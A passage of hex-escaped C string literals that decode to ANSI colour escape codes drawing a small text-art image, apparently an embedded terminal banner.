"\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30"
"\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b"
"\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d"
"\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x35\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34"
"\x37\x6d\x3a\x20\x2e\x20\x2e\x20\x20\x2e\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33"
"\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x6d"
"\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b"
"\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30"
"\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x20\x20\x20\x2e\x2e\x20\x74\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x3b\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x58"
"\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d"
"\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b"
"\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d"
"\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x74\x3b\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x40\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d"
"\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33"
"\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38"
"\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x38\x58\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x33\x3b\x34\x30\x6d\x20\x40\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33"
"\x3b\x34\x30\x6d\x25\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58"
"\x2e\x3b\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b"
"\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30"
"\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x3b\x38\x74\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x2e\x38\x3b\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x53\x20\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37"
"\x3b\x34\x30\x6d\x38\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d"
"\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x20\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x37\x6d\x38\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x20\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b"
"\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x53\x38"
"\x25\x53\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b"
"\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30"
"\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x32\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30"
"\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x40\x58\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d"
"\x3a\x20\x2e\x25\x3b\x2e\x2e\x25\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38"
"\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b"
"\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d"
"\x38\x3a\x2e\x2e\x20\x20\x2e\x2e\x74\x2e\x20\x2e\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33"
"\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x25\x20\x20\x20\x2e\x20\x20"
"\x20\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
